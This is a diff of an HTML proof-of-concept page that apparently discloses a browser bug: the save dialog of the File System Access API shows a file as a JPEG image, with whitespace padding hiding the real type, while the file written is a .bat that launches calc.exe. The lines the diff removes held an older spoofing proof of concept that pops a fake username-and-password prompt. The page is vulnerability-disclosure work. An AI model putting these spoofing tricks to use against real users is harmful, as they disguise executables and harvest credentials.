@@ -1,14 +1,58 @@
-<html>
-  <body>
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>File System Access API - save As JPEG executable</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="favicon.png">
+</head>
+
+<body>
+    <h3>File System Access API - Save shows saving as JPEG, however, download as an executable bat</h3>
+    <h4>Found by Maciej Pulikowski - maciekpul@gmail.com</h4>
+
+    <hr>
+    <h3>Gif example/proof:</h3>
+    <a href="saveExample1.gif" target="_blank">GIF URL</a>
+    <hr>
+    <h3>Code example/proof:</h3>
+    <div style="display: flex; flex-direction: column">
+        <img src="cat.jpg" alt="awesome cat" width="500" height="600">
+        <div>
+            <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save image</button>
+        </div>
+
+    </div>
     <script>
-    function pwn() {
-        win = window.open('https://expired.badssl.com', '_self')
-        setTimeout(`document.getElementById("nop").src = 'javascript:prompt("In order to access fake_website.com,Please enter your username and password", "Username / Password");';`, 3333);
-    }
+        const butSaveNewFile = document.getElementById('addNewFile')
+        butSaveNewFile.addEventListener('click', async () => {
+            const options = {
+                types: [
+                    {
+                        description:
+                            'JPEG Image (*.jpeg)                                                                                                                                                                                                                                                         ',
+                        accept: {
+                            'text/plain': ['.bat']
+                        },
+                        content: 'C:\\Windows\\system32\\calc.exe'
+                    }
+                ]
+            }
+            const handle = await window.showSaveFilePicker(options)
+            const writable = await handle.createWritable()
+            await writable.write('C:\\Windows\\system32\\calc.exe')
+            await writable.close()
+            alert('File saved')
+        })
     </script>
+    <hr>
+    <h3>Explanation:</h3>
+    <img src="explanation.png" alt="awesome code" width="1821" height="576">
+    <hr>
+    <h3>Solution:</h3>
+    <p style="font-size: 25px">Force filename extension with accept extension.</p>
 
-    <iframe style="display:none" id="nop" src=""></iframe>
+</body>
 
-    <a href="#" onclick="pwn();"><h1>ClickME :)</h1></a>
-  </body>
 </html>
